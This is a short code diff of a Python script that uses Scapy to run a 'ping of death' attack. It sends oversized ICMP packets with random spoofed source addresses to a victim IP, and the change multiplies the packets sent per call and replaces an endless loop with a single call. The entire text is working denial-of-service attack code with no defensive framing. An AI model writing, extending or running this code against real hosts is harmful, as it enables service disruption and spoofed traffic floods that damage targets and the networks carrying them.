@@ -27,7 +27,7 @@ def ping_of_death(target_ip):
         print(f"Sending packet number: {i}")
         s_addr = RandIP()
         ping_packet = IP(src=s_addr, dst=target_ip)/ICMP()/(MESSAGE * 60000)
-        send(ping_packet)
+        send(NUMBER_PACKETS*ping_packet)
 
 def main():
     check_root()
@@ -42,8 +42,7 @@ def main():
     
     try:
         print("Press CTRL+C to stop.")
-        while True:
-            ping_of_death(victim_ip)
+        ping_of_death(victim_ip)
     except KeyboardInterrupt:
         print("\nPing of Death stopped.")
 
